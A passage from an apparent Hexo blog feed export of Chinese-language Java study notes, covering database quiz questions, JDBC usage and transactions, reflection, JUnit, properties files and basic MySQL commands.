title="226.Delete 和 truncate 都可以用来删除表内容，一下描述正确的是？"></a>226.Delete 和 truncate 都可以用来删除表内容，一下描述正确的是？</h3><blockquote><p><strong>A Truncate 不需要 rollbacksegment</strong><br><strong>B Delete 需要 rollbacksegment</strong><br><strong>C Truncate 在 提交 commit 之前仍可回滚</strong><br><strong>D Truncate 还可以删除表结构</strong></p></blockquote><h3 id="227-请给出两个影响系统效率的函数。"><a href="#227-请给出两个影响系统效率的函数。" class="headerlink" title="227.请给出两个影响系统效率的函数。"></a>227.请给出两个影响系统效率的函数。</h3><blockquote><p><strong>A UPPER</strong><br><strong>B SUM</strong><br><strong>C MAX</strong><br><strong>D LOWER</strong></p></blockquote><h3 id="228、QUESTION-description-of-the-students-table"><a href="#228、QUESTION-description-of-the-students-table" class="headerlink" title="228、QUESTION. description of the students table:"></a>228、QUESTION. description of the students table:</h3><pre><code> sid_id number start_date date end_date date which two function are valid on the start_date column?_________。</code></pre><blockquote><p><strong>A sum(start_date)</strong><br><strong>B avg(start_date)</strong><br><strong>C count(start_date)</strong><br><strong>D avg(start_date,end_date)</strong><br><strong>E min(start_date)</strong></p></blockquote><h3 id="229、which-are-DML-statements-choose-all-that-apply"><a href="#229、which-are-DML-statements-choose-all-that-apply" class="headerlink" title="229、which are DML statements(choose all that apply)______."></a>229、which are DML statements(choose all that apply)______.</h3><blockquote><p><strong>A commit</strong><br><strong>B merge</strong><br><strong>C update</strong><br><strong>D delete</strong><br><strong>E creat</strong><br><strong>F drop</strong></p></blockquote><h3 id="230、Select-语句中用来连接字符串的符号是"><a href="#230、Select-语句中用来连接字符串的符号是" class="headerlink" title="230、Select 语句中用来连接字符串的符号是______."></a>230、Select 语句中用来连接字符串的符号是______.</h3><blockquote><p><strong>A “+”</strong><br><strong>B “&amp;”</strong><br><strong>C “||”</strong><br><strong>D “|”</strong></p></blockquote><h3 id="231-从-“员工”-表的”姓名”字段中找出名字包含”玛丽”的人，下面哪条-select-语句正确：（-）"><a href="#231-从-“员工”-表的”姓名”字段中找出名字包含”玛丽”的人，下面哪条-select-语句正确：（-）" class="headerlink" title="231.从 “员工” 表的”姓名”字段中找出名字包含”玛丽”的人，下面哪条 select 语句正确：（ ）"></a>231.从 “员工” 表的”姓名”字段中找出名字包含”玛丽”的人，下面哪条 select 语句正确：（ ）</h3><blockquote><p><strong>A Select * from 员工 where 姓名 =’<em>玛丽</em>‘</strong><br><strong>B 、Select * from 员工 where 姓名 =’%玛丽_’</strong><br><strong>C Select * from 员工 where 姓名 like ‘_玛丽%’</strong><br><strong>D Select * from 员工 where 姓名 like ‘%玛丽%’</strong></p></blockquote><h3 id="232-在关系数据库的询问优化中，事先处理文件，如排序、建立索引的目的是（）"><a href="#232-在关系数据库的询问优化中，事先处理文件，如排序、建立索引的目的是（）" class="headerlink" title="232 在关系数据库的询问优化中，事先处理文件，如排序、建立索引的目的是（）"></a>232 在关系数据库的询问优化中，事先处理文件，如排序、建立索引的目的是（）</h3><blockquote><p>**A 优化表达式 **<br>**B 减少中间结果 **<br>**C 扩大缓冲数据 **<br><strong>D 减少扫描文件的时间</strong></p></blockquote><h3 id="233-表-CUSTOMER-包含如下列"><a href="#233-表-CUSTOMER-包含如下列" class="headerlink" title="233 表 CUSTOMER 包含如下列:"></a>233 表 CUSTOMER 包含如下列:</h3><pre><code>CUSTOMER_ID NUMBER(9)LAST_NAME VARCHAR2(20)FIRST_NAME VARCHAR2(20)CREDIT_LIMIT NUMBER(9,2)</code></pre><p>如下代码：</p><pre><code>DECLARECURSOR cust_cursor ISSELECT customer_id, last_name, first_nameFROM customer;cust_rec cust_cursor%ROWTYPE;</code></pre><p>你如何操纵 CUST_REC 中的记录? </p><blockquote><p><strong>A 添加一个 LOOP 到游标声明中.</strong><br><strong>B 在 PL/SQL 块的执行部分，使用 INSERT INTO 语句.</strong><br><strong>C 在 PL/SQL 块的执行部分，使用一个 LOOP 和 FETCH 语句.</strong><br><strong>D 在 PL/SQL 块的执行部分，使用 SELECT 语句使用 INTO 操作.</strong></p></blockquote><h3 id="234-定义存储过程如下："><a href="#234-定义存储过程如下：" class="headerlink" title="234.定义存储过程如下："></a>234.定义存储过程如下：</h3><pre><code>CREATE OR REPLACE PROCEDURE INSERT_TEAM(V_ID in NUMBER,V_CITY in VARCHER2 DEFAULT 'AUSTIN', V_NAMEin VARCHER2)ISBEGININSERT INTO TEAM (id, city,name)VALUES (v_id,v_city,v_name);COMMIT;END;</code></pre><p>以下哪些 PL/SQL 语句能够正确调用该过程？</p><blockquote><p><strong>A EXECUTE INSERT_TEAM;</strong><br><strong>B EXECUTE INSERT_TEAM (V_NAME=.&gt;”LONG HORNS”);</strong><br><strong>C V_CITY=&gt;”AUSTIN”;</strong><br><strong>D EXECUTE INSERT_TEAM (3,”AUSTIN”,”LONG HORNS”)</strong></p></blockquote></applet></strong></applet></strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
            <tag> 测试 </tag>
            
            <tag> 习题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JDBC 编程</title>
      <link href="/2017/04/01/jdbc/"/>
      <url>/2017/04/01/jdbc/</url>
      
        <content type="html"><![CDATA[<p>JDBC 是访问数据库的解决方案，使用相同的方式访问不同的数据库，JDBC 定义了一套标准的接口，不同的数据库厂商根据自己的特点去实现，以达到不同的数据库厂商，通过 Java 访问的方式是一致的。</p><span id="more"></span><h2 id="JDCB-提供的接口："><a href="#JDCB-提供的接口：" class="headerlink" title="JDCB 提供的接口："></a>JDCB 提供的接口：</h2><p>DriverManager驱动管理<br>Connection连接接口<br>Statement语句对象接口<br>PreparedStatement语句对象接口<br>ResultSet结果集接口</p><br>## JDBC 工作原理1. 加载驱动导入包 `Class.forName("com.mysql.jdbc.Driver");`2. 建立连接获取连接:<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">Connection conn = DriverManager.getConnection(url,username,password);url = "jdbc:mysql://localhost:3306/数据库名"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>&gt; Connection 在 `java.sql` 包下<ol start="3"><li><p>创建语句对象</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">Statement st = conn.createStatement();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>Statement 在 <code>java.sql</code> 包下<br>Statement 类针对不同类型的 SQL 语句有不同的执行方法</p></blockquote></li><li><p>执行 SQL 语句</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">boolean st.execute(sql);//该方法通常执行 DDL 语句，永远返回 false ...int st.executeUpdate(sql);//该方法执行 DML 语句，返回影响行数ResultSet rs = st.executeQuery(sql);//该方法执行 DQL 语句，查询出来的数据都封装在 ResultSet 中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>处理结果集<br>执行查询语句（DQL）后返回的结果集，由 ResultSet 接口接收。<br>查询的结果集存放在 ResultSet 对象中<br>ResultSet 对象的最初位置在行首<br>ResultSet 定义了一个方法 next()，表示移动行间记录，读取到行尾返回 false<br>getXXX(),该方法用于根据字段取出相应的内容。</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">while(re.next()) {//遍历结果集int id = rs.getInt("empno");String name = rs.getString("ename");...}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>关闭连接</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">conn.close();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><br>### Statement 与 PreparedStatement 的区别#### Statement 语句对象1. 需要将动态的数据拼接到 SQL 语句中，这样导致程序复杂度高，容易出错。2. Statement 每执行一次都要对传入的 SQL 语句进行预编译一次，效率极差。会对不同的 SQL 语句会进行不同的制定两次执行计划。3. 一般只用于静态的 SQL 语句，及内容不变的语句4. 拼接 SQL 语句导致 SQL 语句寒意发生改变，而导致 SQL 注入问题<h4 id="PreparedStatement-语句对象："><a href="#PreparedStatement-语句对象：" class="headerlink" title="PreparedStatement 语句对象："></a>PreparedStatement 语句对象：</h4><ol><li>PreparedStatement 接口是 Statement 的子接口</li><li>PreparedStatement 有提前 SQL 语句预编译功能。</li><li>一般用于执行动态 SQL 语句，可维护性高，性能稍快。</li><li>能有效防止 SQL 注入</li></ol><blockquote><p>PreparedStatement 更改了 Statement 接口中定义的方法<br>创建 PreparedStatement 语句对象时，传入 SQL 语句，其中 ？代表占位符。<br>调用 PreparedStatement 语句对象的 execute()、executeUpdate 和 executeQuery() 方法都不需要传入 sql 语句</p></blockquote><br>## 事务事务就是对一系列的数据库操作（比如增删改）进行统一的回滚或提交，如果插入成功，那么一起成功，如果中间有任何异常，那么就回滚之前所有的操作。这样可以防止出现脏数据，防止数据库出现错误。<h3 id="事务的特性（ACID）："><a href="#事务的特性（ACID）：" class="headerlink" title="事务的特性（ACID）："></a>事务的特性（ACID）：</h3><ol><li>原子性：事务是一个不可分割的工作单位，事务的原子性确保动作全部完成或全部失败。</li><li>一致性：一旦所有的事务动作完成，事务就被提交。数据和资源就存储于一种满足业务规则的一致性状态中</li><li>隔离性：一个事务的执行不能被其他事务干扰。可能有许多事务会同时处理相同的数据，因此每个事务都应该与其他事务进行隔离开来，防止数据损坏，出现异常</li><li>持久性：事务一旦提交，他对数据库中数据的改变是永久的，无论发生什么系统错误，他的结果都不应该受到影响</li></ol><h2 id="JDBC-管理事务常用-API"><a href="#JDBC-管理事务常用-API" class="headerlink" title="JDBC 管理事务常用 API"></a>JDBC 管理事务常用 API</h2><h3 id="boolean-getAutoCommit"><a href="#boolean-getAutoCommit" class="headerlink" title="boolean getAutoCommit()"></a>boolean getAutoCommit()</h3><p><strong>throws SQLException</strong><br>此方法获取此 Connection 对象的当前自动提交模式。 </p><p><strong>返回：</strong><br>此 Connection 对象的自动提交模式的当前状态 </p><h3 id="void-setAutoCommit-boolean-autoCommit"><a href="#void-setAutoCommit-boolean-autoCommit" class="headerlink" title="void setAutoCommit(boolean autoCommit)"></a>void setAutoCommit(boolean autoCommit)</h3><p><strong>throws SQLException</strong><br>该方法将此连接的自动提交模式设置为给定状态。如果连接处于自动提交模式下，则它的所有 SQL 语句将被执行并作为单个事务提交。否则，它的 SQL 语句将聚集到事务中，直到调用 commit 方法或 rollback 方法为止。默认情况下，新连接处于自动提交模式。<br>提交发生在语句完成时。语句完成的时间取决于 SQL 语句的类型：</p><ul><li>对于 DML 语句（比如 Insert、Update 或 Delete）和 DDL 语句，语句在执行完毕时完成。 </li><li>对于 Select 语句，语句在关联结果集关闭时完成。 </li><li>对于 CallableStatement 对象或者返回多个结果的语句，语句在所有关联结果集关闭并且已获得所有更新计数和输出参数时完成。 <blockquote><p>注：如果在事务和自动提交模式更改期间调用此方法，则提交该事务。如果调用 setAutoCommit 而自动提交模式未更改，则该调用无操作（no-op）。</p></blockquote></li></ul><p><strong>参数：</strong></p><ul><li>autoCommit - 为 true 表示启用自动提交模式；为 false 表示禁用自动提交模式</li></ul><h3 id="void-commit"><a href="#void-commit" class="headerlink" title="void commit()"></a>void commit()</h3><p><strong>throws SQLException</strong><br>使所有上一次提交/回滚后进行的更改成为持久更改，并释放此 Connection 对象当前持有的所有数据库锁。此方法只应该在已禁用自动提交模式时使用。 </p><h3 id="void-rollback"><a href="#void-rollback" class="headerlink" title="void rollback()"></a>void rollback()</h3><p><strong>throws SQLException</strong><br>取消在当前事务中进行的所有更改，并释放此 Connection 对象当前持有的所有数据库锁。此方法只应该在已禁用自动提交模式时使用。 </p><br>## DAO一个完整的项目一般分为**控制层、业务逻辑层、数据访问层、视图层。**<p>DAO 就是数据访问层，其目的是让业务层逻辑和数据进行分开。在应用程序中，业务逻辑层需要和数据进行交互，直接访问 Dao 不涉及任何数据库的具体操作</p><h3 id="实现-DAO-的步骤"><a href="#实现-DAO-的步骤" class="headerlink" title="实现 DAO 的步骤"></a>实现 DAO 的步骤</h3><ol><li>编写 Dao 工具类（DBUtil 工具类）</li><li>一个 Dao 接口（定义了引用程序中用到的方法）</li><li>一个实现 Dao 接口的具体类（实现接口中所有对应的方法，和数据库进行直接交互。）</li><li>数据传递对象（实体类）</li></ol><h3 id="实体类对象："><a href="#实体类对象：" class="headerlink" title="实体类对象："></a>实体类对象：</h3><p>对象关系映射，描述对象和数据表中之间的映射。将 Java 程序中的对象对应到数据库表中，一个实体对象对应数据表中一条记录</p><p><strong>实体类编写</strong></p><ol><li>表名称和类名称对应</li><li>表中的字段和类的属性对应</li><li>遵循 Java Bean 规范（包含无参构造器、get、set、tostring ）</li></ol>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JDBC </tag>
            
            <tag> 数据库 </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反射、debug、Junit 和 properties</title>
      <link href="/2017/03/31/reflect/"/>
      <url>/2017/03/31/reflect/</url>
      
        <content type="html"><![CDATA[<p>反射、debug、Junit 和 properties 是 Java 中比较零散的几个常用技巧。</p><span id="more"></span><h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><h3 id="class-类"><a href="#class-类" class="headerlink" title="class 类"></a>class 类</h3><p>在 Java 中，每一个 class 都有一个相应的 Class 对象，也就是说，当我们编写玩一个类，编译完成后，产生的 .class 文件中就会产生一个 class 对象，用于表示这个类的信息。</p><p>Class 类是反射源头。Class 类的构造器被私有化，无法被访问，但是可以通过下面三种方式实例化 Class 类：</p><ol><li>通过 <code>Class.forName("完整包名.类名")</code> 方法</li><li>通过 <code>类.Class</code></li><li>通过 <code>对象.getClass()</code></li></ol><p>实际开发中 包名.类名—&gt;<br>通过 new 关键字创建对象—&gt;<br>操作这个对象，获取类里面的方法或属性</p><p>反射 Class 类—-&gt;<br>实例化 Class 对象—&gt;<br>包名.类名</p><p>在正常情况下，必须知道一个类的完整路径后才可以实例化对象，但是在 Java 中允许通过一个对象找到其所在的类的信息，那么我们说这就是 Class 类的功能。</p><p>Class 本身就是一个类的本身，通过 CLass 可以完整的得到一个类中完整的结构，包括此类的方法，属性，构造器。</p><h4 id="通过-Class-实例化对象："><a href="#通过-Class-实例化对象：" class="headerlink" title="通过 Class 实例化对象："></a>通过 Class 实例化对象：</h4><p>实际开发中往往需要通过用户指定 包名.类名 创建对象，这样做的好处是做到代码解耦，方便团队开发。Spring 的底层就是通过反射机制创建对象。</p><h3 id="Class-类常用方法："><a href="#Class-类常用方法：" class="headerlink" title="Class 类常用方法："></a>Class 类常用方法：</h3><h4 id="newInstance"><a href="#newInstance" class="headerlink" title="newInstance()"></a>newInstance()</h4><p>创建此 Class 对象所表示的类的一个实例对象,前提是<strong>该类必须存在无参构造器</strong>，这也是为何习惯将每一个自定义的类都添加无参构造器的原因。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Person</span><span class="token punctuation">&gt;</span></span> c <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token comment">//不知道类型就写 ?</span><span class="token keyword">try</span> <span class="token punctuation">{</span>c <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Person</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">)</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//需要强转</span><span class="token class-name">Person</span> p <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="public-Constructor-lt-gt-getConstructors"><a href="#public-Constructor-lt-gt-getConstructors" class="headerlink" title="public Constructor<?>[] getConstructors()"></a>public Constructor&lt;?&gt;[] getConstructors()</h4><p><strong>throws SecurityException</strong><br>该方法返回一个包含某些 Constructor 对象的数组，这些对象反映此 Class 对象所表示的类的所有公共构造方法。如果该类没有公共构造方法，或者该类是一个数组类，或者该类反映一个基本类型或 void，则返回一个长度为 0 的数组。 注意，此方法返回 Constructor<t> 对象的数组（即取自此类构造方法的数组）时，此方法的返回类型是 Constructor&lt;?&gt;[]，不是 预期的 Constructor<t>[]。此少量信息的返回类型是必需的，因为从此方法返回之后，该数组可能被修改以保存不同类的 Constructor 对象，而这将违反 Constructor<t>[] 的类型保证。 </t></t></t></p><p><strong>返回：</strong><br>表示此类公共构造方法的 Constructor 对象数组 </p><h4 id="public-Class-lt-gt-getInterfaces"><a href="#public-Class-lt-gt-getInterfaces" class="headerlink" title="public Class<?>[] getInterfaces()"></a>public Class&lt;?&gt;[] getInterfaces()</h4><p>确定此对象所表示的类或接口实现的接口。<br>如果此对象表示一个类，则返回值是一个数组，它包含了表示该类所实现的所有接口的对象。数组中接口对象顺序与此对象所表示的类的声明的 implements 子句中接口名顺序一致。例如，给定声明： </p><p> class Shimmer implements FloorWax, DessertTopping { … }<br>设 s 的值为 Shimmer 的一个实例；表达式：<br> s.getClass().getInterfaces()[0]<br> 的值为表示 FloorWax 接口的 Class 对象；<br> s.getClass().getInterfaces()[1]<br> 的值为表示 DessertTopping 接口的 Class 对象。<br>如果此对象表示一个接口，则该数组包含表示该接口扩展的所有接口的对象。数组中接口对象顺序与此对象所表示的接口的声明的 extends 子句中接口名顺序一致。 </p><p>如果此对象表示一个不实现任何接口的类或接口，则此方法返回一个长度为 0 的数组。 </p><p>如果此对象表示一个基本类型或 void，则此方法返回一个长度为 0 的数组。 </p><p><strong>返回：</strong><br><strong>该类所实现的接口的一个数组。</strong></p><h4 id="public-Class-lt-super-T-gt-getSuperclass"><a href="#public-Class-lt-super-T-gt-getSuperclass" class="headerlink" title="public Class<? super T> getSuperclass()"></a>public Class&lt;? super T&gt; getSuperclass()</h4><p>该方法返回表示此 Class 所表示的实体（类、接口、基本类型或 void）的超类的 Class。如果此 Class 表示 Object 类、一个接口、一个基本类型或 void，则返回 null。如果此对象表示一个数组类，则返回表示该 Object 类的 Class 对象。 </p><p><strong>返回：</strong><br><strong>此对象所表示的类的超类。</strong></p><p><strong>通过反射获取一个类的全部方法</strong></p><h4 id="public-Method-getMethods"><a href="#public-Method-getMethods" class="headerlink" title="public Method[] getMethods()"></a>public Method[] getMethods()</h4><p><strong>throws SecurityException</strong> 返回一个包含某些 Method 对象的数组，这些对象反映此 Class 对象所表示的类或接口（包括那些由该类或接口声明的以及从超类和超接口继承的那些的类或接口）的公共 member 方法。数组类返回从 Object 类继承的所有（公共）member 方法。返回数组中的元素没有排序，也没有任何特定的顺序。如果此 Class 对象表示没有公共成员方法的类或接口，或者表示一个基本类型或 void，则此方法返回长度为 0 的数组。<br>类初始化方法 <clinit> 不包含在返回的数组中。如果类声明了带有相同参数类型的多个公共成员方法，则它们都会包含在返回的数组中。 </clinit></p><p>请参阅 Java Language Specification 的第 8.2 和 8.4 节。 </p><p><strong>返回：</strong><br>表示此类中公共方法的 Method 对象的数组 </p><h4 id="public-Field-getFields"><a href="#public-Field-getFields" class="headerlink" title="public Field[] getFields()"></a>public Field[] getFields()</h4><p><strong>throws SecurityException</strong><br>返回一个包含某些 Field 对象的数组，这些对象反映此 Class 对象所表示的类或接口的所有可访问公共字段。返回数组中的元素没有排序，也没有任何特定的顺序。如果类或接口没有可访问的公共字段，或者表示一个数组类、一个基本类型或 void，则此方法返回长度为 0 的数组。<br>特别地，如果该 Class 对象表示一个类，则此方法返回该类及其所有超类的<strong>公共字段</strong>。如果该 Class 对象表示一个接口，则此方法返回该接口及其所有超接口的公共字段。 </p><p>该方法不反映数组类的隐式长度字段。用户代码应使用 Array 类的方法来操作数组。 </p><p>请参阅 Java Language Specification 的第 8.2 和 8.3 节。 </p><p><strong>返回：</strong><br>表示公共字段的 Field 对象的数组 </p><h4 id="public-Field-getDeclaredFields"><a href="#public-Field-getDeclaredFields" class="headerlink" title="public Field[] getDeclaredFields()"></a>public Field[] getDeclaredFields()</h4><p><strong>throws SecurityException</strong><br>返回 Field 对象的一个数组，这些对象反映此 Class 对象所表示的类或接口所声明的所有字段。包括公共、保护、默认（包）访问和私有字段，但不包括继承的字段。返回数组中的元素没有排序，也没有任何特定的顺序。如果该类或接口不声明任何字段，或者此 Class 对象表示一个基本类型、一个数组类或 void，则此方法返回一个长度为 0 的数组。<br>请参阅 Java Language Specification 的第 8.2 和 8.3 节。 </p><p><strong>返回：</strong><br>表示此类所有已声明字段的 Field 对象的数组 </p><br>## debug 调试**debug 调试步骤：**1. 设置断点2. DEBUG 模式运行程序3. 观察试图，分析代码执行过程中变量的结果<h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><ul><li>F5 进入：单步执行程序，遇到方法跳入</li><li>F6 跳过：单步执行程序，遇到方法跳过</li><li>F7 跳出：单步执行程序，跳出当前方法</li><li>F8 继续：正常执行程序，遇到断点暂停</li></ul><br>## Junit 创建测试类**创建测试类的步骤：**1. 导入 Junit 测试包2. 新建一个目录存放测试代码3. 测试类使用 Test 作为类的后缀4. 测试方法使用 test 作为前缀/后缀5. 测试方法上面必须有 @Test 修饰6. 测试方法必须是 public void 修饰，不带任何参数<h2 id="解析-properties-文件"><a href="#解析-properties-文件" class="headerlink" title="解析 properties 文件"></a>解析 properties 文件</h2><p>步骤：</p><ol><li>创建一个 Properties 对象</li><li>使用对象的 load()方法进行加载 properties 文件</li><li>使用 getProperty(String key) 获取 value 值</li></ol><blockquote><p>默认 ISO8859-1 编码读写，可以改编写字符集，但不能修改读的字符集</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java">pr<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>类<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getResourceAsStream</span><span class="token punctuation">(</span><span class="token string">"文件名"</span><span class="token punctuation">)</span>pr<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待完善 </tag>
            
            <tag> 调试 </tag>
            
            <tag> 反射 </tag>
            
            <tag> 测试类 </tag>
            
            <tag> 配置文件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL 数据库</title>
      <link href="/2017/03/28/mysql/"/>
      <url>/2017/03/28/mysql/</url>
      
        <content type="html"><![CDATA[<p>关系数据库<br>关系：描述两个元素间的关联或对应关系<br>使用关系模型吧数据库组织到二位数据表(Table)中<br>产品：</p><ul><li>Oracle——主流大型商业</li><li>DB2</li><li>Sybase</li><li>SQL Server</li><li>MySQL——主流小型开源</li></ul><span id="more"></span><h2 id="表的概念"><a href="#表的概念" class="headerlink" title="表的概念"></a>表的概念</h2><ul><li>一个关系数据库由多个数据表组成，数据表是关系数据库的基本存储结构</li><li>表是二维的，由行和列组成</li><li>表的行是横排数据，也被称作记录(Record)</li><li>表的列是纵列数据，也被称作为字段(Field)</li><li>表和表之间存在关联关系</li></ul><br>## 结构化查询语言- SQL 是在关系数据库上执行数据操作、检索及维护所使用的标准语言，可以用来查询数据，操纵数据，定义数据，控制数据- 所有数据库都是用相同或者相似的语言<p>SQL 可分为：</p><ul><li>数据定义语言(DDL)：Data Definition Language,用于建立修改删除数据库对象，包括 Creat、Alter、Drop</li><li>数据操纵语言(DML)：Data Manipulation Language，用于改变数据表中的数据，和事务相关，执行完后需要经过事务控制语句提交后才真正的将改变应用到数据库中，包括 Insert、Update，Delete</li><li>事物控制语言(TCL)：Transaction Control Language，用于维护数据一致性，包括 Commit、Rollback、Savepoint（保存点）</li><li>数据查询语言(DQL)：Data Query Language，用来查询所需要的数据，Select</li><li>数据控制语言(DCL)：Data Control Language，用于执行权限的手语和回收操作，包括 Grant、Revoke、Create User</li></ul><br>## MySQL 基本数据类型<ol><li>数值类型</li><li>字符串类型</li><li>时间日期类型</li></ol><h3 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h3><p>整数<br>浮点数</p><h3 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h3><ul><li>文本</li><li>二进制</li><li>字符串</li></ul><h3 id="时间日期类型"><a href="#时间日期类型" class="headerlink" title="时间日期类型"></a>时间日期类型</h3><ul><li>时间</li><li>日期</li></ul><br>## 创建表创建表之前创建库，表依赖于库1. 创建库：<pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">create database 数据库名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>&gt;这里的 database 是单数<ol start="2"><li><p>查看当前库：</p><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">show databases<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>这里的 database<strong>s</strong> 是复数</p></blockquote></li><li><p>使用某个库：</p><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">use 数据库名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查看当前库下所有表格：</p><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">show tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>table<strong>s</strong> 为复数</p></blockquote></li><li><p>删除库：</p><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">drop database 数据库名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>创建表：</p><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">create table 表名(字段名 数据类型 约束...,字段名 数据类型 约束...);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>查看表结构：desc 表名</p></li></ol><blockquote><p><code>not null</code> 是一种约束条件，用于确保字段值不为空；<br>默认情况下，任何列都允许有空值；<br>当某个字段被设置了非空约束条件，这个字段中必须存在有效值。</p></blockquote><br>## 修改表- 修改表名：<pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">alter table 旧表名 rename 新表名;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>增加列：</li></ul><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">alter table 表名 add 字段名 数据类型;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>删除列：</li></ul><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">alter table 表名 drop 字段名;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>修改列：</li></ul><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">alter table 表名 change 旧字段名 新字段名 数据类型;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>插入记录：</li></ul><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">insert into 表名（字段名 1,字段名 2,字段名 3...) values (值 1,值 2,值 3...);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>插入完整记录：</li></ul><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">insert into 表名 values (值 1,值 2,值 3...);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>更新字段值：</li></ul><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">update 表名 set 字段值=值;update 表名 set 字段名=值 where 字段名=值;update 表名 set 字段名 1=值 1,字段名 2=值 2... where 字段名=值;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>## 查询表- 查询所有列：<pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">select * from 表名;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查询当前时间：</li></ul><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">select now() from dual;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查询某字段名的值：</li></ul><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">select 列名 1, 列名 2... from 表名;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>使用别名：</li></ul><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">select 列名 1 as 别名 1, 列名 2 别名 2, 列名 3 as '别名 3'... from 表名;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>限定范围查询：</li></ul><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">select 列名... from 表名 where 条件;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>数据库默认字符集 utf-8，终端默认字符集 gbk</p></blockquote><br>## 删除- 全删：<pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">delete from 表名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>删除指定字段名的行：</li></ul><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">delete 